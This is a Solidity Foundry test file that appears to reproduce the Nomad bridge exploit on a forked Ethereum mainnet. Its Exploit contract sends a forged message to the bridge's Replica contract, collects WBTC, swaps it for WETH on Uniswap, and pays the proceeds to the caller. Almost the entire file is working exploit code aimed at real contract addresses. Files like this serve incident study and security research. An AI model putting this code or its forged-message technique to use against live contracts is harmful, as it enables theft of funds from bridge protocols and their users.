// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";

contract NomadBridgeExploitTest is Test {
    address exploiter;

    function setUp() public {
        vm.createSelectFork("mainnet", 15259100);
        exploiter = makeAddr("exploiter");
    }

    function testExploit() public {
        emit log_named_decimal_uint("balance", exploiter.balance, 18);

        vm.startPrank(exploiter, exploiter);
        new Exploit().exploit();
        vm.stopPrank();

        emit log_named_decimal_uint("balance", exploiter.balance, 18);
    }
}

contract Exploit {
    function exploit() external {
        IReplica replica = IReplica(0x5D94309E5a0090b165FA4181519701637B6DAEBA);
        IWBTC wbtc = IWBTC(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
        IUniswapV2Pair wbtcWeth = IUniswapV2Pair(0xBb2b8038a1640196FbE3e38816F3e67Cba72D940);
        IWETH weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

        replica.process(
            bytes.concat(
                hex"6265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000",
                bytes20(address(this)),
                hex"00000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a"
            )
        );
        wbtc.transfer(address(wbtcWeth), 10000000000);
        wbtcWeth.swap(0, 1084116533510535209745, address(this), "");
        weth.withdraw(1084116533510535209745);
        (bool success,) = payable(msg.sender).call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {}
}

interface IReplica {
    function process(bytes memory _message) external returns (bool _success);
}

interface IWBTC {
    function transfer(address _to, uint256 _value) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

interface IWETH {
    function withdraw(uint256 wad) external;
}
